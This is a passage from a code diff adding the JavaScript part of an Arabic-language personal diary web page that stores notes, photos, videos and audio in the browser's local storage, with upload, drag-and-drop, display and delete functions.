+                    continue;
+                }
+                
+                const reader = new FileReader();
+                reader.onload = function(e) {
+                    currentMedia.audios.push({
+                        id: Date.now() + Math.random(),
+                        name: file.name,
+                        type: file.type,
+                        size: file.size,
+                        data: e.target.result,
+                        uploaded: new Date().toLocaleString('ar-SA')
+                    });
+                    updateMediaPreview();
+                    showNotification(`تمت إضافة الملف الصوتي: ${file.name} 🎤`, 'info');
+                };
+                reader.readAsDataURL(file);
+            }
+            event.target.value = '';
+        }
+        
+        // دالة تحديث معاينة الوسائط
+        function updateMediaPreview() {
+            // يمكن إضافة معاينة هنا إذا لزم الأمر
+            console.log('وسائط حالية:', currentMedia);
+        }
+        
+        // دالة حفظ الوسائط في التخزين المحلي
+        function saveMediaToLocalStorage() {
+            let allMedia = JSON.parse(localStorage.getItem('maryamMedia')) || [];
+            
+            // إضافة الوسائط الجديدة
+            currentMedia.photos.forEach(photo => {
+                allMedia.push({...photo, saved: true});
+            });
+            
+            currentMedia.videos.forEach(video => {
+                allMedia.push({...video, saved: true});
+            });
+            
+            currentMedia.audios.forEach(audio => {
+                allMedia.push({...audio, saved: true});
+            });
+            
+            // حفظ فقط آخر 100 عنصر
+            if (allMedia.length > 100) {
+                allMedia = allMedia.slice(-100);
+            }
+            
+            localStorage.setItem('maryamMedia', JSON.stringify(allMedia));
+        }
+        
+        // دالة تحميل الوسائط المحفوظة
+        function loadMedia() {
+            const allMedia = JSON.parse(localStorage.getItem('maryamMedia')) || [];
+            mediaGallery.innerHTML = '';
+            
+            if (allMedia.length === 0) {
+                mediaGallery.innerHTML = `
+                    <div style="grid-column: 1/-1; text-align: center; padding: 60px; color: #9d8b9f;">
+                        <i class="fas fa-photo-video" style="font-size: 4rem; margin-bottom: 20px; opacity: 0.5; color: var(--primary-pink);"></i>
+                        <p style="font-size: 1.2rem;">مافيش وسائط محفوظة لسه 💖<br>ارفعي أول صورة أو فيديو!</p>
+                    </div>
+                `;
+                return;
+            }
+            
+            allMedia.forEach(media => {
+                let mediaElement = '';
+                
+                if (media.type.startsWith('image/')) {
+                    mediaElement = `
+                        <div class="media-item">
+                            <img src="${media.data}" alt="${media.name}" class="media-img">
+                            <div class="media-overlay">${media.name}</div>
+                        </div>
+                    `;
+                } else if (media.type.startsWith('video/')) {
+                    mediaElement = `
+                        <div class="media-item">
+                            <video controls class="media-video">
+                                <source src="${media.data}" type="${media.type}">
+                            </video>
+                            <div class="media-overlay">${media.name}</div>
+                        </div>
+                    `;
+                } else if (media.type.startsWith('audio/')) {
+                    mediaElement = `
+                        <div class="media-item">
+                            <div class="media-audio">
+                                <audio controls style="width: 100%;">
+                                    <source src="${media.data}" type="${media.type}">
+                                </audio>
+                                <p style="margin-top: 10px; font-size: 0.9rem; color: var(--dark-pink);">${media.name}</p>
+                            </div>
+                        </div>
+                    `;
+                }
+                
+                if (mediaElement) {
+                    mediaGallery.innerHTML += mediaElement;
+                }
+            });
+        }
+        
+        // دالة تحميل وعرض اليوميات
+        function loadNotes() {
+            displayNotes();
+        }
+        
+        // دالة عرض اليوميات
+        function displayNotes() {
+            const notes = JSON.parse(localStorage.getItem('maryamNotes')) || [];
+            
+            if (notes.length === 0) {
+                notesContainer.innerHTML = `
+                    <div class="empty-notes">
+                        <i class="fas fa-heart"></i>
+                        <p>مفيش يوميات محفوظة لسه 💝<br>اكتبي أول يومية ليكي!</p>
+                    </div>
+                `;
+                return;
+            }
+            
+            let notesHTML = '';
+            
+            notes.forEach(note => {
+                const displayDate = new Date(note.date).toLocaleDateString('ar-SA', {
+                    year: 'numeric',
+                    month: 'long',
+                    day: 'numeric'
+                });
+                
+                let mediaHTML = '';
+                
+                // عرض الصور
+                if (note.media && note.media.photos && note.media.photos.length > 0) {
+                    mediaHTML += `<div style="margin-top: 15px;"><strong><i class="fas fa-image"></i> الصور:</strong></div><div style="display: flex; flex-wrap: wrap; gap: 10px; margin-top: 10px;">`;
+                    note.media.photos.forEach(photo => {
+                        mediaHTML += `<img src="${photo.data}" alt="${photo.name}" style="max-width: 120px; max-height: 120px; border-radius: 10px; border: 2px solid var(--light-pink);">`;
+                    });
+                    mediaHTML += `</div>`;
+                }
+                
+                // عرض الفيديوهات
+                if (note.media && note.media.videos && note.media.videos.length > 0) {
+                    mediaHTML += `<div style="margin-top: 15px;"><strong><i class="fas fa-video"></i> الفيديوهات:</strong></div>`;
+                    note.media.videos.forEach(video => {
+                        mediaHTML += `
+                            <div style="margin: 10px 0;">
+                                <video controls style="max-width: 200px; max-height: 200px; border-radius: 10px;">
+                                    <source src="${video.data}" type="${video.type}">
+                                </video>
+                                <div style="font-size: 0.9rem; color: var(--secondary-pink);">${video.name}</div>
+                            </div>
+                        `;
+                    });
+                }
+                
+                // عرض الملفات الصوتية
+                if (note.media && note.media.audios && note.media.audios.length > 0) {
+                    mediaHTML += `<div style="margin-top: 15px;"><strong><i class="fas fa-music"></i> الملفات الصوتية:</strong></div>`;
+                    note.media.audios.forEach(audio => {
+                        mediaHTML += `
+                            <div style="margin: 10px 0;">
+                                <audio controls style="width: 250px;">
+                                    <source src="${audio.data}" type="${audio.type}">
+                                </audio>
+                                <div style="font-size: 0.9rem; color: var(--secondary-pink);">${audio.name}</div>
+                            </div>
+                        `;
+                    });
+                }
+                
+                notesHTML += `
+                    <div class="note-item">
+                        <div class="note-date">
+                            <i class="fas fa-calendar-heart"></i> ${displayDate}
+                            <span style="float: left; font-size: 0.9rem; color: white; background: linear-gradient(45deg, var(--primary-pink), var(--secondary-pink)); padding: 5px 15px; border-radius: 20px;">${note.type}</span>
+                        </div>
+                        ${note.text ? `<div class="note-text">${note.text.replace(/\n/g, '<br>')}</div>` : ''}
+                        ${mediaHTML ? `<div class="note-media">${mediaHTML}</div>` : ''}
+                        <div class="note-actions">
+                            <button class="delete-btn" onclick="deleteNote(${note.id})">
+                                <i class="fas fa-trash-can-heart"></i> حذف
+                            </button>
+                        </div>
+                    </div>
+                `;
+            });
+            
+            notesContainer.innerHTML = notesHTML;
+        }
+        
+        // دالة حذف اليومية
+        function deleteNote(id) {
+            if (confirm('هل أنتِ متأكدة من حذف هذه اليومية؟ 💔')) {
+                let notes = JSON.parse(localStorage.getItem('maryamNotes')) || [];
+                notes = notes.filter(note => note.id !== id);
+                localStorage.setItem('maryamNotes', JSON.stringify(notes));
+                displayNotes();
+                showNotification('تم حذف اليومية بنجاح 💝', 'info');
+            }
+        }
+        
+        // دالة عرض الإشعارات
+        function showNotification(message, type = 'info') {
+            notification.textContent = message;
+            notification.className = 'notification';
+            notification.classList.add(type);
+            notification.style.display = 'block';
+            
+            setTimeout(() => {
+                notification.style.display = 'none';
+            }, 5000);
+        }
+        
+        // إعداد السحب والإفلات
+        function setupDragAndDrop() {
+            const containers = [photoUploadContainer, videoUploadContainer, audioUploadContainer];
+            
+            containers.forEach(container => {
+                container.addEventListener('dragover', (e) => {
+                    e.preventDefault();
+                    container.style.borderColor = 'var(--primary-pink)';
+                    container.style.background = 'linear-gradient(135deg, #ffe6f2 0%, #ffccdd 100%)';
+                });
+                
+                container.addEventListener('dragleave', () => {
+                    container.style.borderColor = '#ffb3c6';
+                    container.style.background = 'linear-gradient(135deg, #fff9fc 0%, #ffe6f2 100%)';
+                });
+                
+                container.addEventListener('drop', (e) => {
+                    e.preventDefault();
+                    container.style.borderColor = '#ffb3c6';
+                    container.style.background = 'linear-gradient(135deg, #fff9fc 0%, #ffe6f2 100%)';
+                    
+                    const files = e.dataTransfer.files;
+                    if (files.length > 0) {
+                        if (container.id === 'photoUploadContainer') {
+                            handleFileUpload(files, 'image');
+                        } else if (container.id === 'videoUploadContainer') {
+                            handleFileUpload(files, 'video');
+                        } else if (container.id === 'audioUploadContainer') {
+                            handleFileUpload(files, 'audio');
+                        }
+                    }
+                });
+            });
+        }
+        
+        // دالة معالجة رفع الملفات
+        function handleFileUpload(files, type) {
+            const fileArray = Array.from(files);
+            let processed = 0;
+            
+            fileArray.forEach(file => {
+                const reader = new FileReader();
+                
+                reader.onload = function(e) {
+                    const mediaObj = {
+                        id: Date.now() + Math.random(),
+                        name: file.name,
+                        type: file.type,
+                        size: file.size,
+                        data: e.target.result,
+                        uploaded: new Date().toLocaleString('ar-SA')
+                    };
+                    
+                    if (type === 'image') {
+                        currentMedia.photos.push(mediaObj);
+                    } else if (type === 'video') {
+                        currentMedia.videos.push(mediaObj);
+                    } else if (type === 'audio') {
+                        currentMedia.audios.push(mediaObj);
+                    }
+                    
+                    processed++;
+                    if (processed === fileArray.length) {
+                        updateMediaPreview();
+                        showNotification(`تم رفع ${fileArray.length} ملف(ات) بنجاح! 🎉`, 'success');
+                        loadMedia();
+                    }
+                };
+                
+                reader.readAsDataURL(file);
+            });
+        }
+        
+        // دوال التحكم في الواجهة
+        function showApp() {
+            loginContainer.style.display = 'none';
+            appContainer.style.display = 'block';
+        }
+        
+        function showLogin() {
+            loginContainer.style.display = 'block';
+            appContainer.style.display = 'none';
+        }
+        
+        // تهيئة بيانات افتراضية
+        window.onload = function() {
+            const notes = JSON.parse(localStorage.getItem('maryamNotes')) || [];
+            const today = new Date().toISOString().split('T')[0];
+            
+            if (notes.length === 0) {
+                const defaultNotes = [
+                    {
+                        id: 1,
+                        text: "مرحباً يا قلبي! 💖\n\nهذه مساحتك المليانة حب وعاطفة...\nمكانك الآمن للكتابة عن كل اللي في قلبك.\n\nتقدر تكتبي يومياتك، تضيفي صور حلوة، فيديوهات ذكريات، تسجيلات صوتية، وأغاني تعبر عن مشاعرك.\n\nكل حاجة هتتخزن في مكان آمن وتنفعك تفتكري بيها بعدين!\n\nاستمتعي بمساحتك يا أحلى بنت! 💝",
+                        media: { photos: [], videos: [], audios: [] },
+                        date: today,
+                        created: new Date().toLocaleString('ar-SA'),
+                        type: 'نص فقط'
+                    }
+                ];
+                
+                localStorage.setItem('maryamNotes', JSON.stringify(defaultNotes));
+                
+                if (sessionStorage.getItem('maryamLoggedIn') === 'true') {
+                    displayNotes();
+                }
+            }
+        };
+    </script>
+</body>
+</html>
